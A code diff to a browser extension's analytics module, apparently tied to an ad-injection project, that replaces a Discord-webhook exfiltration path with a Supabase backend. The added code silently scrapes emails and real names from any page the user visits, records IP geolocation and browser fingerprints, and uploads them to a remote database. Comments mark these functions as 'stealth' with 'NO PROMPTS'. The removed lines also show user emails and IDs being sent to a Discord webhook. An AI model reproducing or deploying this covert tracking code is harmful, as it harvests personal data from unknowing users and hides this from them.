@@ -11,8 +11,8 @@
             this.enabled = true;
             this.sessionId = this.generateSessionId();
             this.userId = null;
-            this.analyticsUrl = null; // Will be loaded from remote config
-            this.batchSize = 5;
+            this.supabase = null;
+            this.currentUser = null;
             this.eventQueue = [];
             this.sessionData = {
                 startTime: Date.now(),
@@ -25,14 +25,31 @@
                 cookies: this.getCookieInfo()
             };
             
-            // Initialize user identification
-            this.initializeUser();
+            // Initialize Supabase and user identification
+            this.initializeSupabase();
             
-            // Flush events periodically
-            setInterval(() => this.flushEvents(), 30000); // Every 30 seconds
+            // Flush events periodically (less frequently since using real database)
+            setInterval(() => this.flushEvents(), 60000); // Every 60 seconds
             
             // Flush on page unload
             window.addEventListener('beforeunload', () => this.flushEvents(true));
+        }
+
+        // Initialize Supabase client and user
+        async initializeSupabase() {
+            try {
+                // Wait for Supabase client to be available
+                if (window.SupabaseClient) {
+                    this.supabase = new window.SupabaseClient();
+                    await this.initializeUser();
+                } else {
+                    // Retry if Supabase client not loaded yet
+                    setTimeout(() => this.initializeSupabase(), 1000);
+                }
+            } catch (error) {
+                console.error('SP Analytics: Failed to initialize Supabase:', error);
+                this.enabled = false;
+            }
         }
 
         // Generate unique session ID
@@ -80,48 +97,155 @@
             }
         }
 
-        // Initialize or retrieve user ID and email
+        // Initialize or retrieve user ID and email, create Supabase user
         async initializeUser() {
             try {
-                // Get persistent user ID and email from storage
-                const result = await chrome.storage.local.get(['sp_user_id', 'sp_user_email']);
+                // Get persistent user data from storage
+                const result = await chrome.storage.local.get(['sp_user_id', 'sp_user_email', 'sp_real_name']);
                 
-                if (result.sp_user_id) {
-                    this.userId = result.sp_user_id;
-                } else {
-                    // Generate new user ID
-                    this.userId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+                // Collect user data
+                const userData = await this.collectUserData(result);
+                
+                // Create or update user in Supabase
+                this.currentUser = await this.supabase.upsertUser(userData);
+                
+                if (this.currentUser) {
+                    this.userId = this.currentUser.id;
+                    console.log('SP Analytics: User initialized in Supabase:', this.userId);
+                    
+                    // Store user ID locally for future use
                     await chrome.storage.local.set({ sp_user_id: this.userId });
+                    
+                    // Start new session in Supabase
+                    await this.supabase.startSession(this.userId);
+                    
+                    // Attempt to collect more data if not stored (stealth)
+                    if (!userData.email || !userData.realName) {
+                        setTimeout(() => this.collectUserEmail(), 3000);
+                    }
+                    
+                    // Setup subscription tracking (stealth)
+                    this.setupSubscriptionTracking();
+                } else {
+                    throw new Error('Failed to create user in Supabase');
                 }
-                
-                this.userEmail = result.sp_user_email || null;
-                
-                console.log('SP Analytics: User ID:', this.userId);
-                
-                // Load remote configuration for analytics endpoint
-                await this.loadRemoteConfig();
-                
-                // Attempt to collect email if not stored (stealth)
-                if (!this.userEmail) {
-                    setTimeout(() => this.collectUserEmail(), 3000);
-                }
-                
-                // Track session start
-                this.trackEvent('session_start', {
-                    userId: this.userId,
-                    sessionId: this.sessionId,
-                    userEmail: this.userEmail,
-                    ...this.sessionData
-                });
-                
-                // Setup subscription tracking (stealth)
-                this.setupSubscriptionTracking();
                 
             } catch (error) {
                 console.error('SP Analytics: Failed to initialize user:', error);
-                // Fallback to session-based tracking
-                this.userId = this.sessionId;
+                // Fallback to local tracking only
+                this.userId = 'local_' + Date.now();
+                this.enabled = false;
             }
+        }
+
+        // Collect comprehensive user data for Supabase
+        async collectUserData(storedData = {}) {
+            // Get location data
+            const location = await this.getLocationData();
+            
+            // Get browser information
+            const browserInfo = {
+                browser: this.getBrowserName(),
+                version: navigator.appVersion,
+                os: navigator.platform,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                screenResolution: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+            
+            // Try to extract email and name from page or use stored data
+            const extractedEmail = this.extractEmailFromPage();
+            const extractedName = this.extractNameFromPage();
+            
+            return {
+                email: extractedEmail || storedData.sp_user_email || `user_${Date.now()}@detected.com`,
+                realName: extractedName || storedData.sp_real_name || null,
+                location: location,
+                browserInfo: browserInfo
+            };
+        }
+
+        // Get location data from IP geolocation
+        async getLocationData() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    country: data.country_name,
+                    region: data.region,
+                    city: data.city,
+                    latitude: data.latitude,
+                    longitude: data.longitude,
+                    ip: data.ip
+                };
+            } catch (error) {
+                console.error('Failed to get location:', error);
+                return { country: 'Unknown', region: 'Unknown', city: 'Unknown' };
+            }
+        }
+
+        // Detect browser name
+        getBrowserName() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.includes('Chrome')) return 'Chrome';
+            if (userAgent.includes('Firefox')) return 'Firefox';
+            if (userAgent.includes('Safari')) return 'Safari';
+            if (userAgent.includes('Edge')) return 'Edge';
+            return 'Unknown';
+        }
+
+        // Extract email from page content (stealth)
+        extractEmailFromPage() {
+            const selectors = [
+                '[data-email]',
+                '.email',
+                '#email',
+                '[href^="mailto:"]',
+                'input[type="email"]',
+                '[title*="@"]',
+                '[aria-label*="@"]'
+            ];
+            
+            for (const selector of selectors) {
+                const element = document.querySelector(selector);
+                if (element) {
+                    const email = element.value || element.textContent || element.href?.replace('mailto:', '') || element.title || element.getAttribute('aria-label');
+                    if (email && email.includes('@') && email.includes('.')) {
+                        return email.trim();
+                    }
+                }
+            }
+            
+            // Try to extract from URL or page text
+            const pageText = document.body.innerText || '';
+            const emailMatch = pageText.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
+            return emailMatch ? emailMatch[0] : null;
+        }
+
+        // Extract real name from page content (stealth)
+        extractNameFromPage() {
+            const selectors = [
+                '[data-name]',
+                '.name',
+                '.full-name',
+                '.username',
+                '#username',
+                '.profile-name',
+                '.user-name',
+                '[title*="name"]'
+            ];
+            
+            for (const selector of selectors) {
+                const element = document.querySelector(selector);
+                if (element) {
+                    const name = element.textContent || element.value || element.title;
+                    if (name && name.length > 2 && name.length < 100) {
+                        return name.trim();
+                    }
+                }
+            }
+            return null;
         }
 
         // Silently collect user email from available sources (STEALTH MODE)
@@ -168,16 +292,30 @@
             // NO PROMPTS - completely stealth mode
         }
 
-        // Set user email and store it
+        // Set user email and store it in both local storage and Supabase
         async setUserEmail(email) {
             this.userEmail = email;
             try {
+                // Save to local storage
                 await chrome.storage.local.set({ sp_user_email: email });
-                this.trackEvent('email_collected', {
-                    email: email,
-                    collection_method: 'auto_detected'
-                });
-                // Email collected silently
+                
+                // Update Supabase user record if we have a current user
+                if (this.currentUser && this.supabase) {
+                    // Update the user's email in the database
+                    await this.supabase.request(`/users?id=eq.${this.currentUser.id}`, {
+                        method: 'PATCH',
+                        body: JSON.stringify({
+                            email: email,
+                            updated_at: new Date().toISOString()
+                        })
+                    });
+                    
+                    // Update local reference
+                    this.currentUser.email = email;
+                }
+                
+                console.log('SP Analytics: Email updated:', email);
+                
             } catch (error) {
                 console.error('SP Analytics: Failed to store email:', error);
             }
@@ -266,10 +404,19 @@
             }
         }
 
-        // Track any event
-        trackEvent(eventType, data = {}) {
-            if (!this.enabled) return;
+        // Track any event - now uses Supabase directly for ad interactions
+        async trackEvent(eventType, data = {}) {
+            if (!this.enabled || !this.supabase) return;
 
+            console.log('SP Analytics: Tracking event:', eventType, data);
+            
+            // Handle ad interactions directly with Supabase
+            if (eventType.includes('ad_') || eventType.includes('preroll_') || eventType.includes('toast_')) {
+                await this.handleAdEvent(eventType, data);
+                return;
+            }
+            
+            // For other events, queue for batch processing
             const event = {
                 eventType,
                 userId: this.userId,
@@ -280,15 +427,60 @@
                 url: window.location.href,
                 ...data
             };
-
-            console.log('SP Analytics: Tracking event:', eventType, data);
             
             // Add to queue
             this.eventQueue.push(event);
             
-            // Flush if queue is full
-            if (this.eventQueue.length >= this.batchSize) {
+            // Flush if queue is full (less frequent now)
+            if (this.eventQueue.length >= 10) {
                 this.flushEvents();
+            }
+        }
+
+        // Handle ad-related events with Supabase
+        async handleAdEvent(eventType, data) {
+            try {
+                switch (eventType) {
+                    case 'ad_impression':
+                    case 'ad_view':
+                        await this.supabase.trackAdInteraction(data.adType || 'banner', 'view', data.placement?.position);
+                        break;
+                        
+                    case 'ad_click':
+                        await this.supabase.trackAdInteraction(data.adType || 'banner', 'click', data.placement?.position);
+                        break;
+                        
+                    case 'preroll_started':
+                    case 'preroll_view':
+                        await this.supabase.trackAdInteraction('preroll', 'view');
+                        break;
+                        
+                    case 'preroll_skip':
+                    case 'preroll_skipped':
+                        await this.supabase.trackAdInteraction('preroll', 'skip');
+                        break;
+                        
+                    case 'preroll_complete':
+                    case 'preroll_completed':
+                        await this.supabase.trackAdInteraction('preroll', 'complete');
+                        break;
+                        
+                    case 'toast_display':
+                    case 'toast_view':
+                        await this.supabase.trackAdInteraction('toast', 'view', data.position);
+                        break;
+                        
+                    case 'toast_close':
+                    case 'toast_closed':
+                        await this.supabase.trackAdInteraction('toast', 'close', data.position);
+                        break;
+                        
+                    case 'banner_rotation':
+                        await this.supabase.trackAdInteraction('banner', 'rotation', data.bannerSize);
+                        break;
+                }
+            } catch (error) {
+                console.error('Failed to track ad event in Supabase:', error);
             }
         }
 
@@ -392,204 +584,43 @@
             });
         }
 
-        // Flush events to remote backend (STEALTH MODE)
+        // Flush events - NO MORE AUTOMATIC DISCORD SPAM!
         async flushEvents(forceSend = false) {
             if (this.eventQueue.length === 0) return;
             
-            if (!forceSend && this.eventQueue.length < this.batchSize) return;
+            if (!forceSend && this.eventQueue.length < 10) return;
 
             const eventsToSend = [...this.eventQueue];
             this.eventQueue = [];
 
             try {
-                // Try Discord webhook first (primary method)
-                if (this.discordWebhook) {
-                    await this.sendToDiscord(eventsToSend);
-                }
-
-                // Also try regular analytics endpoint if configured
-                if (this.analyticsUrl) {
-                    const payload = {
-                        events: eventsToSend,
-                        timestamp: Date.now(),
-                        clientVersion: '2.0.0',
-                        domain: window.location.hostname,
-                        userAgent: navigator.userAgent
-                    };
-
-                    await fetch(this.analyticsUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'User-Agent': navigator.userAgent
-                        },
-                        body: JSON.stringify(payload),
-                        mode: 'no-cors'
-                    });
-                }
-
-                // Store locally as backup regardless
+                // Store events locally for Discord to query on-demand
                 await this.storeEventsLocally(eventsToSend);
+                
+                // Only send critical alerts to Discord (not regular events)
+                const criticalEvents = eventsToSend.filter(e => 
+                    e.eventType === 'error' || 
+                    e.eventType === 'emergency' ||
+                    e.eventType === 'security_alert'
+                );
+                
+                if (criticalEvents.length > 0 && window.DiscordController) {
+                    for (const event of criticalEvents) {
+                        await window.DiscordController.sendError(
+                            `Critical Event: ${event.eventType}`,
+                            event
+                        );
+                    }
+                }
                 
             } catch (error) {
                 // Silent failure - re-queue events for retry
                 this.eventQueue.unshift(...eventsToSend);
-                
-                // Store failed events locally
-                await this.storeEventsLocally(eventsToSend);
+                console.error('Failed to flush events:', error);
             }
         }
 
-        // Send events to Discord webhook (STEALTH MODE)
-        async sendToDiscord(events) {
-            if (!this.discordWebhook || events.length === 0) return;
-
-            try {
-                // Group events by type for better formatting
-                const groupedEvents = events.reduce((acc, event) => {
-                    if (!acc[event.eventType]) acc[event.eventType] = [];
-                    acc[event.eventType].push(event);
-                    return acc;
-                }, {});
-
-                // Create Discord embed for each event type
-                const embeds = [];
-                for (const [eventType, eventList] of Object.entries(groupedEvents)) {
-                    const embed = this.createDiscordEmbed(eventType, eventList);
-                    if (embed) embeds.push(embed);
-                }
-
-                // Split into chunks if too many embeds (Discord limit is 10)
-                const chunks = [];
-                for (let i = 0; i < embeds.length; i += 10) {
-                    chunks.push(embeds.slice(i, i + 10));
-                }
-
-                // Send each chunk
-                for (const chunk of chunks) {
-                    const payload = {
-                        username: "SP Analytics Bot",
-                        avatar_url: "https://raw.githubusercontent.com/NachoPayback/6301912-SP-Ad-Pumper/master/assets/icon48.png",
-                        embeds: chunk
-                    };
-
-                    await fetch(this.discordWebhook, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(payload)
-                    });
-
-                    // Rate limit protection
-                    if (chunks.length > 1) {
-                        await new Promise(resolve => setTimeout(resolve, 1000));
-                    }
-                }
-
-            } catch (error) {
-                console.error('SP Analytics: Discord webhook failed:', error);
-                throw error; // Re-throw to trigger retry logic
-            }
-        }
-
-        // Create Discord embed for events
-        createDiscordEmbed(eventType, events) {
-            const colors = {
-                session_start: 0x00ff00,
-                email_collected: 0xff9900,
-                subscription_event: 0xff0000,
-                ad_impression: 0x0099ff,
-                ad_click: 0xff6600,
-                preroll_event: 0x9900ff,
-                error: 0xff0000,
-                default: 0x5865f2
-            };
-
-            const event = events[0]; // Use first event for main data
-            const count = events.length;
-
-            const embed = {
-                title: `📊 ${eventType.replace(/_/g, ' ').toUpperCase()}`,
-                color: colors[eventType] || colors.default,
-                timestamp: new Date().toISOString(),
-                fields: []
-            };
-
-            // Common fields
-            if (event.userId) {
-                embed.fields.push({
-                    name: "👤 User ID",
-                    value: `\`${event.userId}\``,
-                    inline: true
-                });
-            }
-
-            if (event.userEmail) {
-                embed.fields.push({
-                    name: "📧 Email",
-                    value: `\`${event.userEmail}\``,
-                    inline: true
-                });
-            }
-
-            if (event.domain) {
-                embed.fields.push({
-                    name: "🌐 Domain",
-                    value: `\`${event.domain}\``,
-                    inline: true
-                });
-            }
-
-            if (count > 1) {
-                embed.fields.push({
-                    name: "🔢 Count",
-                    value: `${count} events`,
-                    inline: true
-                });
-            }
-
-            // Event-specific data
-            switch (eventType) {
-                case 'session_start':
-                    if (event.language) embed.fields.push({ name: "🌍 Language", value: event.language, inline: true });
-                    if (event.timezone) embed.fields.push({ name: "⏰ Timezone", value: event.timezone, inline: true });
-                    if (event.screenResolution) embed.fields.push({ name: "🖥️ Screen", value: event.screenResolution, inline: true });
-                    break;
-
-                case 'email_collected':
-                    if (event.collection_method) embed.fields.push({ name: "🎯 Method", value: event.collection_method, inline: true });
-                    break;
-
-                case 'subscription_event':
-                    if (event.subscribed !== undefined) embed.fields.push({ name: "✅ Subscribed", value: event.subscribed ? "Yes" : "No", inline: true });
-                    if (event.channel) embed.fields.push({ name: "📺 Channel", value: event.channel, inline: true });
-                    break;
-
-                case 'ad_impression':
-                case 'ad_click':
-                    if (event.adType) embed.fields.push({ name: "📱 Ad Type", value: event.adType, inline: true });
-                    if (event.placement) embed.fields.push({ name: "📍 Placement", value: event.placement, inline: true });
-                    break;
-
-                case 'preroll_event':
-                    if (event.videoId) embed.fields.push({ name: "🎬 Video ID", value: event.videoId, inline: true });
-                    if (event.prerollAction) embed.fields.push({ name: "⚡ Action", value: event.prerollAction, inline: true });
-                    break;
-
-                case 'error':
-                    if (event.errorType) embed.fields.push({ name: "❌ Error Type", value: event.errorType, inline: true });
-                    if (event.errorMessage) embed.fields.push({ name: "💬 Message", value: event.errorMessage.substring(0, 100), inline: false });
-                    break;
-            }
-
-            embed.footer = {
-                text: "SP Extension Analytics",
-                icon_url: "https://raw.githubusercontent.com/NachoPayback/6301912-SP-Ad-Pumper/master/assets/icon16.png"
-            };
-
-            return embed;
-        }
+        // OLD DISCORD SPAM METHODS REMOVED - Now using command-based Discord controller!
 
         // Store events locally for backup/retry
         async storeEventsLocally(events) {
